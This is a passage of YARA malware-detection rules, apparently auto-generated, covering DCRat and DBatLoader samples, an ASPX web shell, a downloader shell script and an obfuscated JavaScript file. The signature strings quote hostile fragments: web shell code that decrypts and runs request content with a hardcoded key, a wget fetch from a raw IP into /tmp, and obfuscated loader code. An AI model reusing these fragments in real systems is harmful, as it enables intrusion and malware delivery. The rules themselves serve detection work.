      hash1 = "3bc8b86be3492b3feae4b5fef80145e82cc533e4dfcf59ff623db80ebd44f6b5"
   strings:
      $s1 = "Uyhaik.exe" fullword wide /* score: '22.00'*/
      $s2 = "_DecoratorLogger" fullword ascii /* score: '14.00'*/
      $s3 = "TraverseGeneralVisitor" fullword ascii /* score: '9.00'*/
      $s4 = "get_Tlhjxnnf" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__043be93a {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_043be93a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "043be93ab354959927a2fa05473e599d9d4a1e4a86e2d694640fed4a95ca1648"
   strings:
      $s1 = "XcIrcdK " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule DBatLoader_signature_ {
   meta:
      description = "_subset_batch - file DBatLoader(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dadb4ca52e1d3cb550a109590d9724b30c289f48017ee9d82d33ad5ae2411a92"
   strings:
      $x1 = "')[_0x496020(0x1ae)](''));function getRandomInt(_0x273882,_0x3280fc){var _0x58beaf=_0x496020;return _0x273882=Math[_0x58beaf(0x1" ascii /* score: '39.00'*/
      $x2 = "')[_0x51e4d7(0x1dc)]('');function getRandomInt(_0x4cdeb9,_0x328ad4){var _0xfaa6ba=_0x51e4d7;return _0x4cdeb9=Math[_0xfaa6ba(0x1c" ascii /* score: '36.00'*/
      $x3 = "')[_0x519aac(0x1c3)](''),0x0,![]);function getRandomInt(_0x1bbccc,_0x4e3f82){var _0x5a5065=_0x519aac;return _0x1bbccc=Math[_0x5a" ascii /* score: '36.00'*/
      $x4 = "(function(_0x1271e9,_0x5f01fa){var _0x45f6aa=_0x266c,_0x242890=_0x1271e9();while(!![]){try{var _0x469a9e=parseInt(_0x45f6aa(0x10" ascii /* score: '36.00'*/
      $x5 = "','29702wReuFn','attachEvent','1105475aEYSRg','3994760qVyYxn'];_0x2331=function(){return _0x442583;};return _0x2331();}function " ascii /* score: '36.00'*/
      $s6 = "ll','2702676FTJnEy','11595166GwycUr','#~ #$&^ ##&~!&$&%$!$%*&&#?~^$#% #?$^?$*!~%#?%$ &!%*!#&%#^~^&#  $!%% ?~&&$$ &*&  # *^ ^##^!" ascii /* score: '30.00'*/
      $s7 = "')[_0x54d0ef(0x128)]('');function getRandomInt(_0x5de012,_0x26ac5d){var _0x2e0303=_0x54d0ef;return _0x5de012=Math[_0x2e0303(0x13" ascii /* score: '30.00'*/
      $s8 = ".dll','422068RmYanE','protocol','45GRLNWI','event','href','ceil','mouseout','Run','src','1674013YgFChn','C:\\x5cWin" fullword ascii /* score: '25.00'*/
      $s9 = "A$A$A%A%A^A^g^L^A&A&8*/*/?A?8?A~A~E A A A A!I!A#A#Q$p$V$T%','match','4936440eymMBc','text','host','//stats.wordpress.com/c.gif?s" ascii /* score: '23.00'*/
      $s10 = "of _post!=_0x56bdfe(0x119)?_post:0x0,_0xc3aba=new Image(0x1,0x1);_0xc3aba['src']=_0x4af280+'//stats.wordpress.com/c.gif?s=2&b='+" ascii /* score: '19.00'*/
      $s11 = "d7,_0xf925e1){var _0x4d2b7d=_0x266c;_blog=_0x156fd7,_post=_0xf925e1;if(typeof document[_0x4d2b7d(0x14c)]['host']!=_0x4d2b7d(0x11" ascii /* score: '19.00'*/
      $s12 = "')[_0x496020(0x1ae)]('');function getRandomInt(_0x440dab,_0x390a1e){var _0x378236=_0x496020;return _0x440dab=Math[_0x378236(0x1b" ascii /* score: '19.00'*/
      $s13 = "8996,_0x33160b){var _0x3abe3d=_0x266c;_blog=_0x2a8996,_post=_0x33160b;if(typeof document[_0x3abe3d(0x14c)]['host']!=_0x3abe3d(0x" ascii /* score: '19.00'*/
      $s14 = "typeof _post!=_0x5c0947(0x119)?_post:0x0,_0x3cc103=new Image(0x1,0x1);_0x3cc103['src']=_0x4a0af3+'//stats.wordpress.com/c.gif?s=" ascii /* score: '19.00'*/
      $s15 = "{var _0x5333e4=_0x266c;_blog=_0x1eb8ee,_post=_0x572acf;if(typeof document[_0x5333e4(0x14c)]['host']!=_0x5333e4(0x119))var _0xb20" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 15000KB and
      1 of ($x*) and all of them
}

rule DCRat_signature_ {
   meta:
      description = "_subset_batch - file DCRat(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a24bab299bf335f719defb7555f950c3b64f7ce32e19bdfebfb1c4ccce57c117"
   strings:
      $s1 = "// e7b4998b-edee-4f40-962a-2a0c3eebd1a9 - 638917366556149149" fullword ascii /* score: '12.00'*/
      $s2 = "// 932996de-e6ae-4f49-9a82-3d18240be07c - 638917366556149149" fullword ascii /* score: '9.00'*/
      $s3 = "// 3c9f67f8-d049-4f59-aff9-5d0d58113de2 - 638917366556149149" fullword ascii /* score: '9.00'*/
      $s4 = "// 90ad7f59-2991-45dc-99ed-062438bbb2ee - 638917366556149149" fullword ascii /* score: '9.00'*/
      $s5 = "// 50d2b21a-e247-40c0-9742-9586df04cce1 - 638917366556149149" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 2000KB and
      all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3cc0955e {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3cc0955e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3cc0955e9da17fac13c75e337c50a26cc19edf218c049a51de8ca8a9342457d9"
   strings:
      $s1 = "lBuYvVYWEr0nZhoBQvx.GokDIkYuiGBkGXiOJBP+vDdK08YtI1Y5BN08kLO+dOhk5IY4RY9nZiXeg1W`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "lBuYvVYWEr0nZhoBQvx.GokDIkYuiGBkGXiOJBP+vDdK08YtI1Y5BN08kLO+dOhk5IY4RY9nZiXeg1W`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "eWFPfEJFL9" fullword ascii /* base64 encoded string*/ /* score: '15.00'*/
      $s4 = "a3RZYkJ3NI" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "KSJYIDNHJe" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s6 = "RNSq01Sjf2I4qGYjhL.DU3tWmrwkEyEJ5gvTC" fullword ascii /* score: '12.00'*/
      $s7 = "aCg0WD1vYr" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s8 = "fnbCk7LOgk" fullword ascii /* score: '9.00'*/
      $s9 = "cqeyeBimuEHhTHSAXgh" fullword ascii /* score: '9.00'*/
      $s10 = "uY6drZiRC8WWylhc7B3" fullword ascii /* score: '9.00'*/
      $s11 = "KkJck6FtpbGttj3rUhQ" fullword ascii /* score: '9.00'*/
      $s12 = "uvpLog1AfOC8R6eKJYG" fullword ascii /* score: '9.00'*/
      $s13 = "rKEfv2GEtb" fullword ascii /* score: '9.00'*/
      $s14 = "MeYeNVQO2r" fullword ascii /* score: '9.00'*/
      $s15 = "GFtpnTxNbeKQ4EB6K99" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0d02b916 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d02b916.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d02b9160a66ec959cc0b029816c61576581b92070c23ce5e492dcc3987b5554"
   strings:
      $s1 = "EJF7nhdKZYdbmAsJB75.xoFhjDdgM9OmtGMWH1b+dqKUmGdHfqASxY4qdKH+J4kYbldpLdAtVwuNGR9`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "EJF7nhdKZYdbmAsJB75.xoFhjDdgM9OmtGMWH1b+dqKUmGdHfqASxY4qdKH+J4kYbldpLdAtVwuNGR9`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "RDtaQCRJLL" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "r9SZ03qk7YTHphEAd77" fullword ascii /* score: '9.00'*/
      $s5 = "USKasGqn9tRMEYe4FUL" fullword ascii /* score: '9.00'*/
      $s6 = "UI8Gncmf1lHhftPI5g" fullword ascii /* score: '9.00'*/
      $s7 = "U72hFtpTZ8" fullword ascii /* score: '9.00'*/
      $s8 = "glrUJQhaDTEyem0mYDl" fullword ascii /* score: '9.00'*/
      $s9 = "zgK4E06geThJIboX73" fullword ascii /* score: '9.00'*/
      $s10 = "FTPhPS2gFtlA5swrOgc" fullword ascii /* score: '9.00'*/
      $s11 = "RTqR6fTPgE" fullword ascii /* score: '9.00'*/
      $s12 = "GYFkdLLvAsC6IE9sfx2" fullword ascii /* score: '9.00'*/
      $s13 = "DykMSLOfeKe9eGeTT1O" fullword ascii /* score: '9.00'*/
      $s14 = "fSqRsXcdi1UG02LsPYN" fullword ascii /* score: '9.00'*/
      $s15 = "QVcWoHhNyfgvIRChUjY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2ededd10 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2ededd10.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2ededd10789ae612a8b0ae004fe41bfb362593d8b6a31db1d7ad5d51cb4806b3"
   strings:
      $s1 = "FhoySGOjdqyuChPsS8t.S2RK2NO19usYwuqAgZS+iTvRHCOmoLMggWfWXOo+h1Nu35OU7LlpvAjM0Tj`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "FhoySGOjdqyuChPsS8t.S2RK2NO19usYwuqAgZS+iTvRHCOmoLMggWfWXOo+h1Nu35OU7LlpvAjM0Tj`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "UjhPSmNLXs" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s4 = "MlNAXT89L3" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "b19KXTpDL6" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "UHhqPCw0bX" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "NXZrRms3UZ" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "OVVNekhWcW" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "SSVhcD4uI2" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "FtpbYVwRE3" fullword ascii /* score: '10.00'*/
      $s11 = "jEO9GLriPDLlipiYGDE" fullword ascii /* score: '9.00'*/
      $s12 = "kVN2EmOVBEdLlZqGF2g" fullword ascii /* score: '9.00'*/
      $s13 = "Ya5XjuI6N5uMvaEYexV" fullword ascii /* score: '9.00'*/
      $s14 = "d4cJFbAio25pgSeyeHj" fullword ascii /* score: '9.00'*/
      $s15 = "jxHrRf5KMDll4mkeARF" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32f9509a {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32f9509a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32f9509a9a48373f81cf96263f3d39978af984e5515274639c5cdc122b68b0ab"
   strings:
      $s1 = "p8SrwnpHoresnILj5rb.IcEvPbplIYanVHQx2ZJ+RLIA3jpPaadpOiAgZs5+S5UQrqp52mYuTXTD0Je`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "p8SrwnpHoresnILj5rb.IcEvPbplIYanVHQx2ZJ+RLIA3jpPaadpOiAgZs5+S5UQrqp52mYuTXTD0Je`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "LEFJM1JhWk" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s4 = "KXBXUm9jax" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "PyhnZX16LP" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "MSdNNHQ7PB" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "ciI8XE51MU" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s8 = "iWk44uIPnPJ1oVgeTcZ" fullword ascii /* score: '9.00'*/
      $s9 = "RpGETDKhgd8jovPopwM" fullword ascii /* score: '9.00'*/
      $s10 = "ddllUm5k7fNLgyj1YV1" fullword ascii /* score: '9.00'*/
      $s11 = "qRNd88EIdpspYecDIfE" fullword ascii /* score: '9.00'*/
      $s12 = "eJaU2m6lOgI0BhQDUqb" fullword ascii /* score: '9.00'*/
      $s13 = "yZ8aGL2TqXehftPgPil" fullword ascii /* score: '9.00'*/
      $s14 = "NDll5XPGmueA5v9eVZu" fullword ascii /* score: '9.00'*/
      $s15 = "JQKuMEYekXNnlESpOXV" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fe52872f {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fe52872f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe52872f104c32ec7ebf1b43a8bea7de154abfb504a17d99b4756a1271f88c22"
   strings:
      $s1 = "Lsp2idpvuBb9MiN3URJ.gf5FRJptGypkEZFLejd+jQjutNp4pVLGwO5UMgX+MoPBsNpLkJXixDSRBKk`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "Lsp2idpvuBb9MiN3URJ.gf5FRJptGypkEZFLejd+jQjutNp4pVLGwO5UMgX+MoPBsNpLkJXixDSRBKk`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "KRDdaPXRZ" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "ODxSX2BqKk" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "KVhFVGl2Ki" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "XERNVkA1JW" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "R01efXlBWF" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "ND55SjlKdw" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s9 = "xVoBlSpyYOfmpaCZBq6" fullword ascii /* score: '10.00'*/
      $s10 = "YrmYnfua5irk2fTpqqi" fullword ascii /* score: '9.00'*/
      $s11 = "neyEXR2dGJ" fullword ascii /* score: '9.00'*/
      $s12 = "FuYOJWIrAt" fullword ascii /* score: '9.00'*/
      $s13 = "py6FduDlLGQfNxp4Ffj" fullword ascii /* score: '9.00'*/
      $s14 = "c4Sm3KXQfs2XtPp0clf" fullword ascii /* score: '9.00'*/
      $s15 = "CkC5LUMvFtPoMZMZZ86" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ff00d412 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff00d412.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff00d412bfd7b31a97892664fff8f23061d5fb27b26282803d31cafa10e393b5"
   strings:
      $s1 = "HJtOlQNuVcf5kjZe4Fx.YXv0IbNTqLi4PHu325F+o4guavNghWRTcKhhbXf+hhLSOCNnOonD3KPVEqA`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "HJtOlQNuVcf5kjZe4Fx.YXv0IbNTqLi4PHu325F+o4guavNghWRTcKhhbXf+hhLSOCNnOonD3KPVEqA`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "JExBUycod6" fullword ascii /* base64 encoded string */ /* score: '15.00'*/
      $s4 = "YWVeIU1DJI" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s5 = "WHJPX0tuR7" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "vMAkFtpmQPyWEDAsQ96" fullword ascii /* score: '10.00'*/
      $s7 = "ngVfqwEyeiKRavUkCBE" fullword ascii /* score: '9.00'*/
      $s8 = "DT0c1iqqtTncSEftPd3" fullword ascii /* score: '9.00'*/
      $s9 = "iKFVVP5dlLAi5w1oHq9" fullword ascii /* score: '9.00'*/
      $s10 = "AZJ6ttspY3N7n3IWY1P" fullword ascii /* score: '9.00'*/
      $s11 = "SCCjnLyrGvTTlog49v" fullword ascii /* score: '9.00'*/
      $s12 = "dtirCc224x0BPE9xI2o" fullword ascii /* score: '9.00'*/
      $s13 = "TlOGeF8jNom0EYPwfQ3" fullword ascii /* score: '9.00'*/
      $s14 = "Hgpjiv4clOGuXKsDXVq" fullword ascii /* score: '9.00'*/
      $s15 = "zfESfTPdAZqhxRG0aAg" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__47334204 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_47334204.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "473342049f1b8951f181f886f59e7c4e2c1a059153b19b84af2ca41b8521d1a9"
   strings:
      $s1 = "hymwlQuNOkDpXuQpekw.nUuFvwufJGce7O5jaZf+NiODJLu6b33DfUuMDxO+MRDcmQuGkksratE9D69`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "hymwlQuNOkDpXuQpekw.nUuFvwufJGce7O5jaZf+NiODJLu6b33DfUuMDxO+MRDcmQuGkksratE9D69`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "LWhvXVFIaH" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s4 = "eEclQyRJIw" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "FuVZ39aUFSMKeyei7uc" fullword ascii /* score: '12.00'*/
      $s6 = "fm43KlZXU3" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s7 = "wiqjLOGwv7" fullword ascii /* score: '10.00'*/
      $s8 = "xSyB0a9EIXXWqUiiRch" fullword ascii /* score: '9.00'*/
      $s9 = "J3wyvSQdeYESXM5A53p" fullword ascii /* score: '9.00'*/
      $s10 = "KDNLl8MoqeYEQ6ASjmy" fullword ascii /* score: '9.00'*/
      $s11 = "hNirCg3JkdkS4AOE9JN" fullword ascii /* score: '9.00'*/
      $s12 = "MlOGUOWjXO" fullword ascii /* score: '9.00'*/
      $s13 = "yXgCVKV0PrBUgETgq2c" fullword ascii /* score: '9.00'*/
      $s14 = "IRyqPQaHffweyexjwQu" fullword ascii /* score: '9.00'*/
      $s15 = "D4U8sY5Z3pSpYf9xZug" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__61f02ed0 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_61f02ed0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "61f02ed00c1bb28290803d163d39330bed7eaeb213d87d0d9a09b5e74a047e0e"
   strings:
      $s1 = "SXoFO22L4DItkobs7R5.RJ2ZKs2BEFr3ILuTZ7H+IfP4Hn2SC1HvopLxXSb+fCLA3K2rwQDGbNxJK9J`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "SXoFO22L4DItkobs7R5.RJ2ZKs2BEFr3ILuTZ7H+IfP4Hn2SC1HvopLxXSb+fCLA3K2rwQDGbNxJK9J`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "V3FhKlBnIp" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s4 = "dTRheU8ldG" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "PTRMPFVFcv" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "STFrOVxtVw" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "R2k8IUQ6ee" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s8 = "yJfb4CSpYwgTH9mcDjB" fullword ascii /* score: '9.00'*/
      $s9 = "KVslFtpGCYMWZhmUL6g" fullword ascii /* score: '9.00'*/
      $s10 = "sVrBlUg1dRXEQEgEtwh" fullword ascii /* score: '9.00'*/
      $s11 = "FZCou8ixLlCPlZ6Spy4" fullword ascii /* score: '9.00'*/
      $s12 = "dJtoHA3DJsEYeTwHRiM" fullword ascii /* score: '9.00'*/
      $s13 = "IRcDDeJSDZ9befLb7DL" fullword ascii /* score: '9.00'*/
      $s14 = "oiFMX0GSxtsIrcGVOAU" fullword ascii /* score: '9.00'*/
      $s15 = "rrTcuQpfQLEtPLCDspY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__de90b854 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_de90b854.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de90b854645d6f6fd770c9bf9599140a6685af0df0ba99a274fe9695b17b6fb6"
   strings:
      $s1 = "X4qiJR8tqKSrsD4f6qH.GrePbZ8CKISEjsQiybd+NsE3Yd8Jed7HI5R2VVI+gttJYU8FMWI656YyRHn`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "X4qiJR8tqKSrsD4f6qH.GrePbZ8CKISEjsQiybd+NsE3Yd8Jed7HI5R2VVI+gttJYU8FMWI656YyRHn`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "k59PG8cduMPCBD30RPN" fullword ascii /* score: '14.00'*/
      $s4 = "fWxDWHA3ZU" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "XVdFNT5QLR" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "OC9aTWdBeV" fullword ascii /* base64 encoded string ' */ /* score: '14.00'*/
      $s7 = "mZsE3D4sJHlekeYE8F1" fullword ascii /* score: '12.00'*/
      $s8 = "KE5RMU5cPT" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s9 = "rbOuEvTeMPPBi5x6e7I" fullword ascii /* score: '11.00'*/
      $s10 = "eHIrc38kUCOiEvs6rQW" fullword ascii /* score: '9.00'*/
      $s11 = "* sqT_" fullword ascii /* score: '9.00'*/
      $s12 = "heADhIYJ3w" fullword ascii /* score: '9.00'*/
      $s13 = "wUxktJEBP0cFV3HGoZG" fullword ascii /* score: '9.00'*/
      $s14 = "rQj1DLleFNuCEGrMayD" fullword ascii /* score: '9.00'*/
      $s15 = "neesglOGQj3hteqq8mI" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fd693dab {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd693dab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd693dab1e6273554ce0234a609a2d78012741dcf5a5cd4abe85fcec46510883"
   strings:
      $s1 = "rf7qi7AhPGJSx4EtHs2.XQ8S7SAteb2I3clsLQe+YRSSBdAjXs2ErKBjZ87+w2upL8As9abFPFL9xtL`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "rf7qi7AhPGJSx4EtHs2.XQ8S7SAteb2I3clsLQe+YRSSBdAjXs2ErKBjZ87+w2upL8As9abFPFL9xtL`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "bnZjMEFgJ6" fullword ascii /* base64 encoded string  */ /* score: '15.00'*/
      $s4 = "ImJvWipyRp" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "cT4hPjBmVN" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "IWc4ZTRGZD" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s7 = "ipBqEyeAH4" fullword ascii /* score: '10.00'*/
      $s8 = "IircyhNqFCCYbgmhRJ2" fullword ascii /* score: '10.00'*/
      $s9 = "kJwrsYw47a8b9JSPyyy" fullword ascii /* score: '9.00'*/
      $s10 = "P5DHLOGR6j95xDLUsDc" fullword ascii /* score: '9.00'*/
      $s11 = "sNlDllwqP1m69RjmYJN" fullword ascii /* score: '9.00'*/
      $s12 = "klobvanXbEfjLoG87Iq" fullword ascii /* score: '9.00'*/
      $s13 = "i10hETndLTJOG1SpYGd" fullword ascii /* score: '9.00'*/
      $s14 = "IOCDi9lOG3wu7uIeiEY" fullword ascii /* score: '9.00'*/
      $s15 = "odnLOPEgLC4cfTpDKNa" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule dd3aef03fa889c6daa441af89a9cdf2c71f4d8b1ddc59e0b43d6e284a21fd2d1_dd3aef03 {
   meta:
      description = "_subset_batch - file dd3aef03fa889c6daa441af89a9cdf2c71f4d8b1ddc59e0b43d6e284a21fd2d1_dd3aef03.aspx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd3aef03fa889c6daa441af89a9cdf2c71f4d8b1ddc59e0b43d6e284a21fd2d1"
   strings:
      $x1 = "<%try{Session.@Add(\"key\",\"1248e0acf6e27116\"); byte[] key = Encoding.Default.GetBytes(Session[0] + \"\"),content = Request.Bi" ascii /* score: '37.00'*/
      $s2 = "<%try{Session.@Add(\"key\",\"1248e0acf6e27116\"); byte[] key = Encoding.Default.GetBytes(Session[0] + \"\"),content = Request.Bi" ascii /* score: '27.00'*/
      $s3 = "h*u@!hhL41vR0yj*/.CreateDecryptor(key, key);byte[] decryptContent = decryptor.TransformFinalBlock(content, 0, content.Length);@S" ascii /* score: '19.00'*/
      $s4 = "h*u@!hhL41vR0yj*/.CreateDecryptor(key, key);byte[] decryptContent = decryptor.TransformFinalBlock(content, 0, content.Length);@S" ascii /* score: '18.00'*/
      $s5 = "();System.Security.Cryptography.ICryptoTransform decryptor = Brx1u4/*Z#" fullword ascii /* score: '14.00'*/
      $s6 = "ad(Request.ContentLength);System.Security.Cryptography.RijndaelManaged Brx1u4 = new System.Security.Cryptography.RijndaelManaged" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule f2dd39956c54dfa372c88f487428d4a8138adeee5a822ee894fb65853cfc0a3f_f2dd3995 {
   meta:
      description = "_subset_batch - file f2dd39956c54dfa372c88f487428d4a8138adeee5a822ee894fb65853cfc0a3f_f2dd3995.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2dd39956c54dfa372c88f487428d4a8138adeee5a822ee894fb65853cfc0a3f"
   strings:
      $s1 = "    wget http://67.21.32.81/$a" fullword ascii /* score: '12.00'*/
      $s2 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule df4eb4d592062546d9161ee53e7b180f21e5b0fe9faa72311427b970abe03142_df4eb4d5 {
   meta:
      description = "_subset_batch - file df4eb4d592062546d9161ee53e7b180f21e5b0fe9faa72311427b970abe03142_df4eb4d5.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "df4eb4d592062546d9161ee53e7b180f21e5b0fe9faa72311427b970abe03142"
   strings:
      $s1 = "ax^H_\\x0ap\\x0d\\x10\\x0dKXCNYDBC\\x05r\\x1dU\\x18\\x1c\\x14KLL\\x01\\x0dr\\x1dUH\\x1cK\\x19\\x1dK\\x01\\x0dr\\x1dUH\\x1d\\x18" ascii /* score: '9.00'*/
